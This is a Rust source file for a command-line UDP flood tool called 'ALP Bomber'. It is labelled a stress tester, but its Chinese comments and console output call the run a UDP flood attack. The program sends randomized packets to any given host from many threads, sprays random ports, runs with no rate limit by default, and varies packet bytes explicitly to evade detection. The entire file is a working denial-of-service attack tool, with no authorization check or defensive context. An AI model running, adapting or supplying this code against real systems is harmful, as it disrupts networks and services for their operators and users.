use clap::{Arg, Command, value_parser};
use rand::rngs::ThreadRng;
use rand::{rngs::SmallRng, Rng, SeedableRng};
use socket2::{Domain, Protocol, Socket, Type};
use std::net::{IpAddr, SocketAddr, ToSocketAddrs, UdpSocket};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::thread;
use std::time::{Duration, Instant};
use std::io;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let matches = Command::new("ALP Bomber")
        .version("0.2.0")
        .author("Rust Developer")
        .about("超高性能网络压力测试工具")
        .arg(
            Arg::new("ip")
                .required(true)
                .help("Target IP address or hostname"),
        )
        .arg(
            Arg::new("port")
                .value_parser(value_parser!(u16)) // Use value_parser directly
                .default_value("0")
                .help("Target port (0 for random)"),
        )
        .arg(
            Arg::new("threads")
                .short('t')
                .long("threads")
                .value_parser(value_parser!(usize)) // Use value_parser
                .default_value("64")
                .help("Number of worker threads"),
        )
        .arg(
            Arg::new("packet_size")
                .short('s')
                .long("size")
                .value_parser(value_parser!(usize)) // Use value_parser
                .default_value("0")
                .help("Packet size in bytes (0 for random 64-1024 bytes)"),
        )
        .arg(
            Arg::new("rate_limit")
                .short('r')
                .long("rate")
                .value_parser(value_parser!(u64))
                .default_value("0")
                .help("速率限制 (每秒包数, 0表示无限制)"),
        )
        .arg(
            Arg::new("duration")
                .short('d')
                .long("duration")
                .value_parser(value_parser!(u64)) // Use value_parser
                .default_value("100")
                .help("Duration in seconds (0 for infinite)"),
        )
        .get_matches();

    // Extract arguments using clap's typed retrieval
    let target_host = matches.get_one::<String>("ip").expect("IP is required"); // Should not fail if required(true)
    let port = *matches
        .get_one::<u16>("port")
        .expect("Port has a default value");
    let thread_count = *matches
        .get_one::<usize>("threads")
        .expect("Threads has a default value");
    let packet_size_setting = *matches
        .get_one::<usize>("packet_size")
        .expect("Packet size has a default value");
    let duration = *matches
        .get_one::<u64>("duration")
        .expect("Duration has a default value");
    let rate_limit = *matches
        .get_one::<u64>("rate_limit")
        .expect("Rate limit has a default value");

    // --- Resolve Target Address ---
    println!("[INFO] Resolving target: {}", target_host);
    let ip_addr = match target_host.parse::<IpAddr>() {
        Ok(addr) => addr,
        Err(_) => {
            // Try to resolve as hostname
            let host_port = (target_host.as_str(), port); // Use resolved port if specified for resolution hint
            match host_port.to_socket_addrs() {
                // Use as_str() here
                Ok(mut addrs) => {
                    if let Some(addr) = addrs.next() {
                        println!("[INFO] Resolved '{}' to {}", target_host, addr.ip());
                        addr.ip()
                    } else {
                        eprintln!(
                            "Error: Cannot resolve hostname '{}' to any IP address",
                            target_host
                        );
                        return Ok(()); // Exit gracefully
                    }
                }
                Err(e) => {
                    eprintln!("Error: Failed resolving hostname '{}': {}", target_host, e);
                    return Ok(()); // Exit gracefully
                }
            }
        }
    };

    // --- Setup Signal Handling ---
    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();

    // 注册跨平台 Ctrl+C（及 SIGTERM/SIGHUP）
    ctrlc::set_handler(move || {
        println!("\n[INFO] Received termination signal. Shutting down gracefully...");
        r.store(false, Ordering::SeqCst);
    })
    .expect("[ERROR] Failed to set Ctrl-C handler");

    // --- Prepare Packet Buffers ---
    const MIN_RAND_SIZE: usize = 64;
    const MAX_RAND_SIZE: usize = 1024;
    const BURST_SIZE: usize = 256; // 每次批量发送的数据包数量
    const DESIRED_BUF_SIZE: usize = 8 * 1024 * 1024; // 8MB

    // 确定数据包大小策略
    let (use_random_size, effective_packet_size) = if packet_size_setting == 0 {
        (true, MAX_RAND_SIZE) // 缓冲区需要容纳最大随机大小
    } else {
        // 如果指定了固定大小，确保至少为 MIN_RAND_SIZE
        let size = packet_size_setting.max(MIN_RAND_SIZE);
        if packet_size_setting < MIN_RAND_SIZE {
            eprintln!(
                "[WARN] 指定的数据包大小 {} 小于最小值 {}。使用 {} 字节。",
                packet_size_setting, MIN_RAND_SIZE, size
            );
        }
        (false, size)
    };

    // 预先生成多个随机数据模板，提供更多变化
    let mut template_buffers = Vec::with_capacity(8);
    let mut thread_rng = ThreadRng::default();
    
    // 生成8个不同的模板，增加攻击包的多样性
    for _ in 0..8 {
        let mut buffer = vec![0u8; MAX_RAND_SIZE];
        SmallRng::seed_from_u64(thread_rng.random()).fill(&mut buffer[..]);
        template_buffers.push(buffer);
    }
    
    // 共享模板缓冲区集合
    let template_buffers = Arc::new(template_buffers);
    
    // 用于统计发送的包数
    let packet_counter = Arc::new(AtomicU64::new(0));

    // --- Print Attack Info ---
    println!("[INFO] 开始 UDP 洪水攻击...");
    println!("[INFO]   目标 IP:       {}", ip_addr);
    println!(
        "[INFO]   目标端口:      {}",
        if port != 0 {
            port.to_string()
        } else {
            "随机 (1-65535)".to_string()
        }
    );
    println!("[INFO]   线程数:        {}", thread_count);
    println!(
        "[INFO]   数据包大小:    {}",
        if !use_random_size {
            format!("{} 字节", effective_packet_size)
        } else {
            format!("随机 ({}-{} 字节)", MIN_RAND_SIZE, MAX_RAND_SIZE)
        }
    );
    println!("[INFO]   批量发送大小:  {} 包/批次", BURST_SIZE);
    println!(
        "[INFO]   持续时间:      {}",
        if duration > 0 {
            format!("{} 秒", duration)
        } else {
            "无限 (Ctrl+C 停止)".to_string()
        }
    );
    println!(
        "[INFO]   速率限制:      {}",
        if rate_limit > 0 {
            format!("{} 包/秒", rate_limit)
        } else {
            "无限制".to_string()
        }
    );

    // --- Setup Timing ---
    let end_time = if duration > 0 {
        Some(Instant::now() + Duration::from_secs(duration))
    } else {
        None
    };

    // --- 优化网络参数 ---
    println!("[INFO] 优化网络性能参数...");

    // --- 启动工作线程 ---
    let mut handles = Vec::with_capacity(thread_count);
    let packet_counter_clone = packet_counter.clone();
    println!("[INFO] 正在启动 {} 个工作线程...", thread_count);
    
    // 计算每线程速率限制（如果启用了全局速率限制）
    let per_thread_rate_limit = if rate_limit > 0 {
        // 每个线程的速率上限，平均分配，额外增加10%冗余
        (rate_limit as f64 / thread_count as f64 * 1.1) as u64
    } else {
        0 // 无限制
    };
    
    for i in 0..thread_count {
        let running_clone = running.clone();
        let template_buffers_clone = template_buffers.clone();
        let target_ip = ip_addr;
        let target_port = port;
        let use_random_size_clone = use_random_size;
        let effective_size = effective_packet_size;
        let end_time_clone = end_time;
        let thread_id = i + 1;
        let packet_counter = packet_counter_clone.clone();
        let thread_rate_limit = per_thread_rate_limit;

        let handle = thread::spawn(move || {
            // 使用更高效的小型随机数生成器，而不是默认的全局实现
            let mut rng = SmallRng::seed_from_u64(ThreadRng::default().random());
            
            // 为每个线程分配不同的工作模式，增加攻击多样性
            let work_mode = thread_id % 3; // 0,1,2三种模式
            
            // 创建该线程的UDP套接字
            let socket = match Socket::new(Domain::IPV4, Type::DGRAM, Some(Protocol::UDP)) {
                Ok(s) => s,
                Err(e) => {
                    eprintln!("创建 socket2 套接字失败: {}", e);
                    return;
                }
            };

            // 设置套接字选项以优化性能
            // 套接字优化设置
            if let Err(e) = socket.set_nonblocking(true) {
                eprintln!(
                    "[线程 {}] 警告: 设置套接字非阻塞模式失败: {}",
                    thread_id, e
                );
            }
            
            // 增加发送缓冲区大小
            if let Err(e) = socket.set_send_buffer_size(DESIRED_BUF_SIZE) {
                eprintln!("设置发送缓冲区失败: {}", e);
            }
            
            let addr: SocketAddr = "0.0.0.0:0".parse().unwrap();
            if let Err(e) = socket.bind(&addr.into()) {
                eprintln!("绑定失败: {}", e);
                return;
            }
            
            let socket: UdpSocket = socket.into(); // 转换为标准库类型
            
            // 预先计算固定目标地址（如果使用固定端口）
            let fixed_target: Option<SocketAddr> = if target_port != 0 {
                Some(SocketAddr::new(target_ip, target_port))
            } else {
                None
            };

            // 为这个线程创建自己的数据包缓冲区，而不是共享一个
            let mut thread_buffer = vec![0u8; effective_size];
            let mut targets = Vec::with_capacity(BURST_SIZE);
            let mut sizes = Vec::with_capacity(BURST_SIZE);
            
            // 速率限制相关变量
            let mut packets_this_second = 0u64;
            let mut second_start = Instant::now();
            
            // 线程工作模式配置
            let preferred_size_min = match work_mode {
                0 => MIN_RAND_SIZE,                      // 默认随机大小
                1 => (MIN_RAND_SIZE + MAX_RAND_SIZE)/2,  // 偏向中等大小包
                2 => MAX_RAND_SIZE - 100,                // 偏向大包
                _ => MIN_RAND_SIZE
            };
            
            let preferred_size_max = match work_mode {
                0 => MAX_RAND_SIZE,                      // 默认随机大小
                1 => (MIN_RAND_SIZE + MAX_RAND_SIZE)/2 + 100, // 偏向中等大小包
                2 => MAX_RAND_SIZE,                      // 偏向大包
                _ => MAX_RAND_SIZE
            };
            
            // --- 主发送循环 ---
            'outer: loop {
                // 检查运行状态
                if !running_clone.load(Ordering::Relaxed) {
                    break;
                }

                // 检查持续时间限制
                if let Some(end) = end_time_clone {
                    if Instant::now() >= end {
                        break;
                    }
                }

                // 准备批量发送的目标地址和大小
                targets.clear();
                sizes.clear();

                for _ in 0..BURST_SIZE {
                    // 确定这次迭代的数据包大小
                    let current_size = if use_random_size_clone {
                        // 根据线程工作模式选择不同的包大小范围
                        rng.random_range(preferred_size_min..=preferred_size_max)
                    } else {
                        effective_size
                    };
                    
                    // 确定这次迭代的目标地址
                    let target = match fixed_target {
                        Some(addr) => addr,
                        None => {
                            // 生成随机端口 (1-65535)
                            let random_port = rng.random_range(1..=65535u16);
                            SocketAddr::new(target_ip, random_port)
                        }
                    };
                    
                    targets.push(target);
                    sizes.push(current_size);
                }
                
                for i in 0..BURST_SIZE {
                    // 速率限制检查
                    if thread_rate_limit > 0 {
                        let now = Instant::now();
                        if now.duration_since(second_start).as_secs() >= 1 {
                            // 重置计数器
                            packets_this_second = 0;
                            second_start = now;
                        } else if packets_this_second >= thread_rate_limit {
                            // 达到速率限制，短暂休眠
                            thread::sleep(Duration::from_millis(10));
                            continue 'outer;
                        }
                    }
                    
                    let size = sizes[i];
                    let target = targets[i];
                    
                    // 从多个模板中随机选择一个，增加攻击包多样性
                    let template_idx = rng.random_range(0..template_buffers_clone.len());
                    
                    // 复制随机数据到线程缓冲区，并添加变异以减少包检测规律
                    thread_buffer[..size].copy_from_slice(&template_buffers_clone[template_idx][..size]);
                    
                    // 添加随机变异，让每个包看起来不一样
                    if size > 8 {
                        // 增加变异区域，以4字节为单位最多变异3处
                        let mut positions = Vec::with_capacity(3);
                        for _ in 0..3 {
                            positions.push(rng.random_range(0..(size-8)));
                        }
                        
                        for pos in positions {
                            rng.fill(&mut thread_buffer[pos..pos+4]);
                        }
                    }
                    
                    // 发送数据包并正确计数
                    match socket.send_to(&thread_buffer[..size], target) {
                        Ok(_) => {
                            // 修复统计：每个成功发送的包都计数
                            packet_counter.fetch_add(1, Ordering::Relaxed);
                            
                            // 速率限制计数
                            if thread_rate_limit > 0 {
                                packets_this_second += 1;
                            }
                        }
                        Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
                            // 套接字缓冲区已满，轻微延迟让操作系统处理
                            thread::yield_now();
                            continue 'outer;
                        }
                        Err(_) => {
                            // 其他错误忽略
                        }
                    }
                    
                    // 优化：批量完成后适当让出CPU，避免单个线程占用过多资源
                    if rand::random::<u8>() < 5 { // 约2%的概率让出CPU
                        thread::yield_now();
                    }
                }
            }
            // 线程在循环中断时自然结束
        });

        handles.push(handle);
    }

    // --- 等待线程并显示统计信息 ---
    println!("[INFO] 所有线程已启动。等待完成或中断...");
    
    // 创建一个统计线程，定期显示发包速率
    let packet_counter_stats = packet_counter.clone();
    let running_stats = running.clone();
    
    let stats_handle = thread::spawn(move || {
        let mut last_count = 0u64;
        let mut last_time = Instant::now();
        
        while running_stats.load(Ordering::Relaxed) {
            thread::sleep(Duration::from_secs(1));
            
            let current_time = Instant::now();
            let current_count = packet_counter_stats.load(Ordering::Relaxed);
            let delta_time = current_time.duration_since(last_time).as_secs_f64();
            
            if delta_time > 0.0 {
                let delta_count = current_count - last_count;
                let pps = delta_count as f64 / delta_time;
                
                // 增强统计显示：添加带宽信息
                // 估算带宽 (按平均包大小750字节计算，如果使用随机大小)
                let avg_packet_size = if packet_size_setting == 0 { 750.0 } else { packet_size_setting as f64 };
                let bandwidth_mbps = (pps * avg_packet_size * 8.0) / 1_000_000.0;
                
                println!(
                    "[STATS] 速率: {:.2} 包/秒 ({:.2} Mbps), 总计: {} 包",
                    pps,
                    bandwidth_mbps,
                    current_count
                );
                
                last_count = current_count;
                last_time = current_time;
            }
        }
    });
    
    // 等待所有工作线程完成
    for (i, handle) in handles.into_iter().enumerate() {
        if let Err(e) = handle.join() {
            eprintln!("[Main] 错误: 线程 {} 连接失败: {:?}", i + 1, e);
        }
    }
    
    // 确保统计线程也能自然结束
    if let Err(e) = stats_handle.join() {
        eprintln!("[Main] 错误: 统计线程连接失败: {:?}", e);
    }

    println!("[INFO] 攻击已完成或被用户中断。");
    Ok(())
}
